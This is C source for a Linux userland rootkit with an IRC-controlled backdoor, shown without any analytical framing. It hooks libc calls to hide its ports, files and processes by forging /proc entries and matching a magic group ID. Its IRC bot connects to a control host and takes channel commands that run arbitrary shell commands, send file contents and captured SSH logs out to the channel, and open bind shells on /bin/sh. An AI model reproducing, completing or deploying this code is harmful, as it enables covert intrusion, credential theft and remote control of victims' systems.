void write_hidden_port(int port)
{
    HOOK(o_fopen,"fopen");
    FILE *hports=o_fopen(INSTALL_DIR"/hidden_ports","a");
    if(!hports) return;
    fprintf(hports,"%d",port);
    fclose(hports);
}

int is_hidden_port(int port)
{
    char line[32];
    int r=0;
    HOOK(o_fopen,"fopen");
    FILE *fp=o_fopen(INSTALL_DIR"/hidden_ports","r");
    if(!fp) return r;
    while(fgets(line,sizeof(line),fp) != NULL)
    {
        if(atoi(line)==port)
        {
            r=1;
            break;
        }
    }
    if(fp) fclose(fp);
    return r;
}

void kill_rk_procs(void);
int kill_self(void)
{
    if(getuid() != 0) return -1;
    HOOK(o_opendir,"opendir");
    HOOK(o_readdir,"readdir");
    HOOK(o_unlink,"unlink");
    HOOK(o_rmdir,"rmdir");
    DIR *dirp=o_opendir(INSTALL_DIR);
    if(!dirp) return -1;
    struct dirent *dir;
    char path[256];
    while((dir=o_readdir(dirp)) != NULL)
    {
        if(!strcmp(".\0",dir->d_name) || !strcmp("..\0",dir->d_name)) continue;
        snprintf(path,sizeof(path),"%s/%s",INSTALL_DIR,dir->d_name);
        if(o_unlink(path)<0) return -1;
    }
    if(o_rmdir(INSTALL_DIR)<0) return -1;
    if(o_unlink(LDSP)<0) return -1;
    kill_rk_procs();
    return 0;
}

FILE *forge_procnet(const char *pathname)
{
    HOOK(o_fopen,"fopen");
    FILE *tmp, *pnt=o_fopen(pathname,"r");
    if((tmp=tmpfile()) == NULL) return pnt;

    unsigned long rxq,txq,t_len,retr,inode;
    int lport,rport,d,state,uid,t_run,tout;
    char line[LINE_MAX],raddr[128],laddr[128],etc[128];

    char *pnetstr="%d: %64[0-9A-Fa-f]:%X %64[0-9A-Fa-f]:%X %X %lX:%lX %X:%lX %lX %d %d %lu %512s\n";
    while(fgets(line, LINE_MAX, pnt) != NULL)
    {
        sscanf(line, pnetstr, &d, laddr, &lport, raddr, &rport, &state, &txq,
                              &rxq, &t_run, &t_len, &retr, &uid, &tout, &inode,
                              etc);
        if(is_hidden_port(lport) || is_hidden_port(rport)) continue;
        fputs(line,tmp);
    }
    fclose(pnt);
    if(tmp != NULL) fseek(tmp,0,SEEK_SET);
    return tmp;
}

FILE *forge_maps(const char *pathname)
{
    HOOK(o_fopen, "fopen");

    char buf[PATH_MAX];
    FILE *o=tmpfile(), *pnt;
    if((pnt = o_fopen(pathname, "r")) == NULL) { errno = ENOENT; return NULL; }

    while(fgets(buf, sizeof(buf), pnt) != NULL) if(!strstr(buf, INSTALL_DIR)) fputs(buf, o);
    fclose(pnt);
    fseek(o,0,SEEK_SET);
    return o;
}

FILE *forge_smaps(const char *pathname)
{
    HOOK(o_fopen, "fopen");

    char buf[PATH_MAX]; int i=0;
    FILE *o=tmpfile(), *pnt;
    if((pnt=o_fopen(pathname, "r")) == NULL) { errno = ENOENT; return NULL; }

    while(fgets(buf, sizeof(buf), pnt) != NULL)
    {
        if(i>0) i++;
        if(i>15) i=0;
        if(strstr(buf, INSTALL_DIR)) i=1;
        if(i==0) fputs(buf,o);
    }
    fclose(pnt);
    fseek(o,0,SEEK_SET);
    return o;
}

FILE *forge_numamaps(const char *pathname)
{
    HOOK(o_fopen, "fopen");

    char buf[PATH_MAX];
    FILE *o=tmpfile(), *pnt;
    if((pnt=o_fopen(pathname, "r")) == NULL) { errno = ENOENT; return NULL; }

    while(fgets(buf, sizeof(buf), pnt) != NULL)
    {
        char addr[128], type[64], location[PATH_MAX];
        sscanf(buf, "%s %s %s", addr, type, location);
        if(!strncmp(location, "file=", strlen("file="))) if(!strstr(location, INSTALL_DIR)) fputs(buf,o);
    }
    fclose(pnt);
    fseek(o,0,SEEK_SET);
    return o;
}

char *gdirname(DIR *dirp)
{
    int fd;
    char fd_path[256], *filename=(char *)malloc(256);

    memset(filename, 0, 256);
    fd=dirfd(dirp);
    snprintf(fd_path, 255, "/proc/self/fd/%d", fd);
    if(readlink(fd_path, filename, 255) < 0) return NULL;
    return filename;
}

int hxstat(const char *path, int mode)
{
    if(mode==32)
    {
        HOOK(o_xstat, "__xstat");
        struct stat s_fstat;
        memset(&s_fstat, 0, sizeof(stat));
        o_xstat(_STAT_VER, path, &s_fstat);
        if(s_fstat.st_gid==MGID) return 1;
    }else if(mode==64){
        HOOK(o_xstat64, "__xstat64");
        struct stat64 s_fstat;
        memset(&s_fstat, 0, sizeof(stat64));
        o_xstat64(_STAT_VER, path, &s_fstat);
        if(s_fstat.st_gid==MGID) return 1;
    }

    return 0;
}

int hfxstat(int fd, int mode)
{
    if(mode==32)
    {
        HOOK(o_fxstat, "__fxstat");
        struct stat s_fstat;
        memset(&s_fstat, 0, sizeof(stat));
        o_fxstat(_STAT_VER, fd, &s_fstat);
        if(s_fstat.st_gid==MGID) return 1;
    }else if(mode==64){
        HOOK(o_fxstat64, "__fxstat64");
        struct stat64 s_fstat;
        memset(&s_fstat, 0, sizeof(stat64));
        o_fxstat64(_STAT_VER, fd, &s_fstat);
        if(s_fstat.st_gid==MGID) return 1;
    }

    return 0;
}

char *cprocname()
{
    HOOK(o_fopen,"fopen");
    char *pname=(char *)malloc(512);
    FILE *cmdline=o_fopen("/proc/self/cmdline","r");
    if(cmdline==NULL) return "bash";
    fread(pname,255,1,cmdline);
    fclose(cmdline);
    return pname;
}

char *gcmdline()
{
    HOOK(o_open,"open");
    HOOK(o_read,"read");
    char *cmdline=malloc(2048),path[256];
    int i, c, fd;
    snprintf(path, sizeof(path), "/proc/self/cmdline");
    if((fd=o_open(path,0,0)) < 0) snprintf(cmdline,5,"bash");
    else{
        c=o_read(fd,cmdline,sizeof(cmdline));
        for(i=0;i<c;i++) if(cmdline[i]==0x00) cmdline[i]=0x20;
    }
    if(fd) close(fd);
    return cmdline;
}

int is_bad_proc(const char *filename)
{
    if(strstr(cprocname(),"ssh") || strstr(filename,"ssh")) return 0;
    char fnm_proc[64];
    int i;
    for(i=0; i<sizeof(bad_bins)/sizeof(bad_bins[0]); i++)
    {
        snprintf(fnm_proc,sizeof(fnm_proc),"*/%s",bad_bins[i]);
        if(strstr(cprocname(),bad_bins[i]) || strstr(filename,bad_bins[i]) ||
           !fnmatch(fnm_proc,filename,FNM_PATHNAME)) return 1;
    }
    return 0;
}

void kill_rk_procs(void)
{
    HOOK(o_opendir,"opendir");
    HOOK(o_readdir,"readdir");
    HOOK(o_xstat,"__xstat");

    DIR *dirp=o_opendir("/proc");
    if(dirp == NULL)
    {
        (void) kill_self(); // cya
        exit(0);
    }

    struct dirent *dir;
    struct stat s_fstat;
    int w=0;
    memset(&s_fstat,0,sizeof(stat));

    char pp[512];
    while((dir=o_readdir(dirp)) != NULL)
    {
        if(!strcmp(dir->d_name, ".\0") || !strcmp(dir->d_name, "/\0") ||
           !strcmp(dir->d_name, "net") || !strcmp(dir->d_name,"self") ||
           !strcmp(dir->d_name, "thread-self")) continue;

        snprintf(pp,sizeof(pp),"/proc/%s",dir->d_name);
        o_xstat(_STAT_VER,pp,&s_fstat);
        if(s_fstat.st_gid==MGID) { w=1; kill(atoi(dir->d_name),SIGTERM); }
    }
    closedir(dirp);
    if(w) sleep(BPROC_WAIT); // if we've killed any rk processes, we wait for sockets to die completely
    return;
}

int is_betrayed_alive(void)
{
    HOOK(o_opendir,"opendir");
    HOOK(o_readdir,"readdir");
    HOOK(o_xstat,"__xstat");

    DIR *dirp=o_opendir("/proc");
    if(dirp == NULL)
    {
        if(getuid() == 0) (void) kill_self();
        exit(0);
    }

    struct dirent *dir;
    struct stat s_fstat;
    memset(&s_fstat,0,sizeof(stat));

    char pp[512];
    while((dir=o_readdir(dirp)) != NULL)
    {
        if(!strcmp(dir->d_name, ".\0") || !strcmp(dir->d_name, "/\0") ||  // we need to chase down an actual
           !strcmp(dir->d_name, "net") || !strcmp(dir->d_name,"self") ||  // process id to see if we're running already.
           !strcmp(dir->d_name, "thread-self")) continue;

        snprintf(pp,sizeof(pp),"/proc/%s",dir->d_name);
        o_xstat(_STAT_VER,pp,&s_fstat);
        if(s_fstat.st_gid==MGID) return 1;
    }
    closedir(dirp);
    return 0;
}

int read_line(int sock, char *buffer) {
    size_t length = 0;
    while (1) {
        char data;
        int result = recv(sock, &data, 1, 0);
        if ((result <= 0) || (data == EOF)) exit(1);

        buffer[length] = data;
        length++;
        if (length >= 2 && buffer[length-2] == '\r' && buffer[length-1] == '\n') {
            buffer[length-2] = '\0';
            return length;
        }
    }
}

char *get_prefix(char *line) {
    char *prefix = malloc(512);
    char clone[512];

    strncpy(clone, line, strlen(line) + 1);
    if (line[0] == ':') {
        char *splitted = strtok(clone, " ");
        if (splitted != NULL) strncpy(prefix, splitted+1, strlen(splitted)+1);
        else prefix[0] = '\0';
    } else prefix[0] = '\0';
    return prefix;
}

char *get_username(char *line) {
    char *username = malloc(512);
    char clone[512];

    strncpy(clone, line, strlen(line) + 1);
    if (strchr(clone, '!') != NULL) {
        char *splitted = strtok(clone, "!");
        if (splitted != NULL) strncpy(username, splitted+1, strlen(splitted)+1);
        else username[0] = '\0';
    } else username[0] = '\0';
    return username;
}

char *get_command(char line[]){
    char *command = malloc(512);
    char clone[512];
    strncpy(clone, line, strlen(line)+1);

    char *splitted = strtok(clone, " ");
    if (splitted != NULL){
        if (splitted[0] == ':') splitted = strtok(NULL, " ");
        if (splitted != NULL) strncpy(command, splitted, strlen(splitted)+1);
        else command[0] = '\0';
    }else command[0] = '\0';
    return command;
}

char *get_last_argument(char line[]){
    char *argument = malloc(512);
    char clone[512];
    strncpy(clone, line, strlen(line)+1);
    char *splitted = strstr(clone, " :");
    if (splitted != NULL) strncpy(argument, splitted+2, strlen(splitted)+1);
    else argument[0] = '\0';
    return argument;
}

char *get_argument(char line[], int argno){
    char *argument = malloc(512);
    char clone[512];
    strncpy(clone, line, strlen(line)+1);

    int current_arg = 0;
    char *splitted = strtok(clone, " ");
    while (splitted != NULL){
        if (splitted[0] != ':') current_arg++;
        if (current_arg == argno){
            strncpy(argument, splitted, strlen(splitted)+1);
            return argument;
        }
        splitted = strtok(NULL, " ");
    }

    if (current_arg != argno) argument[0] = '\0';
    return argument;
}

void set_nick(int sock, char nick[])
{
    char nick_packet[512];
    sprintf(nick_packet, "NICK %s\r\n", nick);
    send(sock, nick_packet, strlen(nick_packet), 0);
}

void send_user_packet(int sock, char nick[])
{
    char user_packet[512];
    sprintf(user_packet, "USER %s 0 * %s\r\n", nick, nick);
    send(sock, user_packet, strlen(user_packet), 0);
}

void join_channel(int sock, char channel[])
{
    char join_packet[512];
    sprintf(join_packet, "JOIN %s\r\n", channel);
    send(sock, join_packet, strlen(join_packet), 0);
}

void send_pong(int sock, char argument[])
{
    char pong_packet[512];
    sprintf(pong_packet, "PONG :%s\r\n", argument);
    send(sock, pong_packet, strlen(pong_packet), 0);
}

void send_message(int sock, char to[], char message[])
{
    char message_packet[512];
    sprintf(message_packet, "PRIVMSG %s :%s\r\n", to, message);
    send(sock, message_packet, strlen(message_packet), 0);
}

int setup_connection(void)
{
    int s;
    struct addrinfo hints,*res;
    memset(&hints,0,sizeof(hints));
    hints.ai_family=AF_UNSPEC;
    hints.ai_socktype=SOCK_STREAM;
    hints.ai_flags=AI_PASSIVE;

    int rc=getaddrinfo(HOST,PORT,&hints,&res);
    if(rc<0) exit(0);
    s=socket(res->ai_family,res->ai_socktype,res->ai_protocol);
    if(s<0) goto fail;
    if(connect(s,res->ai_addr,res->ai_addrlen)<0) goto fail;
    freeaddrinfo(res);

    set_nick(s, NICK);
    send_user_packet(s, NICK);
    return s;
fail:
    freeaddrinfo(res);
    exit(0);
}

void populate_chrs(char *line, char **pfix, char **uname, char **cmd, char **larg)
{
    *pfix=get_prefix(line);
    *uname=get_username(line);
    *cmd=get_command(line);
    *larg=get_last_argument(line);
    return;
}

#define CMSG(buf) send_message(sockfd,CHANNEL,buf);
int sfd,rc,scli;
void commit_btermicide(void)
{
    shutdown(sfd,SHUT_RDWR);
    close(sfd);
}

int create_bind_shell(int port)
{
    sfd=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);
    if(sfd<0) return -1;

    struct sockaddr_in us,them;
    bzero((char *)&us,sizeof(us));
    us.sin_family=AF_INET;
    us.sin_port=htons(port);
    us.sin_addr.s_addr=htonl(INADDR_ANY);

    rc=bind(sfd,(struct sockaddr *)&us, sizeof(us));
    if(rc != 0) return -1;

    if(fork() == 0)
    {
        setpgrp();
        write_hidden_port(port);
        rc=listen(sfd,5);
        if(rc != 0) exit(0);

        signal(SIGTERM,(sighandler_t)commit_btermicide);
        while(1)
        {
            socklen_t slen=sizeof(them);
            scli=accept(sfd, (struct sockaddr *)&them, &slen);
            if(scli<0) exit(0);

            int x;
            for(x=2;x>=0;x--) dup2(scli,x);
            execl("/bin/sh", "sh", (char *)0);
            close(scli);
        }
        close(scli);
        exit(0);
    }else{
        signal(SIGCHLD,SIG_IGN);
        return 1;
    }
}

void betrayer(int s)
{
    FILE *fp;
    char line[512],fbuf[128],*ucmd;
    HOOK(o_fopen,"fopen");
    while(1)
    {
        (void) read_line(s,line);
        populate_chrs(line,&prefix,&username,&command,&largument);

        if(!strcmp(command,"PING"))
        {
            send_pong(s,largument);

            /* some services require that you have ponged a ping before joining channels.
               some don't. but those that don't may also kick us for trying to join a channel
               too fast.
               so until we've ponged a ping, we don't really do anything but wait about on a ping. */
            if(!have_ponged)
            { join_channel(s, CHANNEL); have_ponged=1; }
        }

        /* once we know that we more or less have a solid connection, we can start doing stuff. */
        if(have_ponged)
        {
            ucmd = get_argument(line,3);
            /* it is mandatory that these operations have another argument to go along
             * with them. */
            if(ucmd[0] != '\0')
            {
                /* reads outgoing ssh logfile and sends to channel */
                if(!strncmp(largument,"!ssh_logs",strlen("!ssh_logs")) && !strcmp(NICK,ucmd))
                {
                    fp=o_fopen(SSH_LOGS,"r");
                    if(!fp) continue;
                    while(fgets(fbuf,sizeof(fbuf),fp) != NULL)
                    {
                        CMSG(fbuf);
                        sleep(SEND_TOUT);
                    }
                    fclose(fp);
                }

                /* allows you to execute commands from the channel.
                 * sends the output of said command(s) to the channel so you
                 * can see what's going on. */
                if(!strncmp(largument,"!sh",strlen("!sh")) && !strcmp(NICK,ucmd))
                {
                    char *shcmd=strdup(largument),cmd[128];
                    shcmd+=4+strlen(NICK)+1;
                    snprintf(cmd,sizeof(cmd),"%s 2>/dev/null",shcmd); /* we don't want errors popping up randomly. */
                    fp=popen(shcmd,"r");                              /* that would be weird... */
                    if(!fp) continue;
                    while(fgets(fbuf,sizeof(fbuf),fp) != NULL) CMSG(fbuf);
                    pclose(fp);
                }

                if(!strncmp(largument,"!read_file",strlen("!read_file")) && !strcmp(NICK,ucmd))
                {
                    char *file=get_argument(line,4);
                    fp=o_fopen(file,"r");
                    if(!fp) continue;
                    while(fgets(fbuf,sizeof(fbuf),fp) != NULL)
                    {
                        CMSG(fbuf);
                        sleep(SEND_TOUT);
                    }
                    fclose(fp);
                }

                if(!strncmp(largument,"!bind",strlen("!bind")) && !strcmp(NICK,ucmd))
                {
                    int port=atoi(get_argument(line,4));
                    if(!port) continue;
                    if(create_bind_shell(port)<0) continue;
                    else{
                        char nmsg[64];
                        snprintf(nmsg,sizeof(nmsg),"bind shell created. listening for connections on port %d",port);
                        CMSG(nmsg);
                    }
                }

                /* i'm adding persistent ld.so.preload. soon.
                 * when i add it, make an exception so we're able to actually uninstall the kit
                 * when we want to. */
                if(!strncmp(largument,"!kill",strlen("!kill")) && (!strcmp(NICK,ucmd) || !strcmp("all",ucmd)))
                {
                    if(kill_self()<0)
                    {
                        CMSG("something went wrong killing myself.");
                        continue;
                    }
                }
            }
        }
    }
}
